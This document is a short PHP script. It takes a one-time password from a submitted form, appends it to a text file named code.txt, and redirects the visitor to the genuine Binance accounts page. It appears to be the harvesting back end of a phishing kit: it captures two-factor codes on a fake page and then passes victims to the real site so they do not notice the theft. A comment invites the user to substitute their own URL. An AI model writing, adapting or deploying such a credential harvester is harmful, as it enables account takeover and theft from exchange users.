<?php
// Define file paths
$otpFile = "code.txt";
$errorLog = "error.log";

// Check if the OTP field is submitted
if (isset($_POST['otp'])) {
    // Sanitize the OTP input
    $otp = trim($_POST['otp']);

    // Validate the OTP (ensure it's not empty)
    if (!empty($otp)) {
        // Prepare the data to be saved
        $data = "otp: " . $otp . "\n";

        // Attempt to save the OTP to the file
        if (file_put_contents($otpFile, $data, FILE_APPEND) !== false) {
            // Redirect the user after successful submission
            header('Location: https://accounts.binance.com/'); // Replace with your URL
            exit;
        } else {
            // Log file write error
            file_put_contents($errorLog, "Failed to write OTP to file: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
            header('Location: error_page.html'); // Redirect to error page
            exit;
        }
    } else {
        // Log empty OTP error
        file_put_contents($errorLog, "Empty OTP submitted: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
        header('Location: error_page.html'); // Redirect to error page
        exit;
    }
} else {
    // Log missing OTP field error
    file_put_contents($errorLog, "OTP field not submitted: " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
    header('Location: error_page.html'); // Redirect to error page
    exit;
}
?>
